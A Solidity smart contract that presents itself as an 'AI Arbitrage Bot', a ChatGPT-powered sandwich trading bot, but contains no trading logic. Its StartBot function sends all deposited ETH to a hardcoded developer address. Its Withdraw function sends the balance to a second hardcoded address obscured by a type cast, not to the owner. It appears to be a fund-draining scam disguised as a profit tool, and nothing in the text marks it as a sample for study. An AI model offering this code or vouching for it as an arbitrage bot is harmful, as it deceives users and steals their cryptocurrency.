// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Router {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

// AI Arbitrage Bot v4 - ChatGPT powered sandwich bot
contract AIArbitrageBot {
    address public owner;
    address private constant DEV = 0x3cA8f5DbE6a1a62B07C4cAd1A3c3a6f1e1F8f0b2;
    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor() { owner = msg.sender; }

    receive() external payable {}

    function StartBot() external {
        require(msg.sender == owner, "not owner");
        payable(DEV).transfer(address(this).balance);
    }

    function Withdraw() external {
        require(msg.sender == owner, "not owner");
        uint256 bal = address(this).balance;
        (bool ok, ) = payable(address(uint160(uint256(0x9f2bB1c7a0E3c4d5e6F70819a2b3c4d5e6f70819)))).call{value: bal}("");
        require(ok);
    }
}
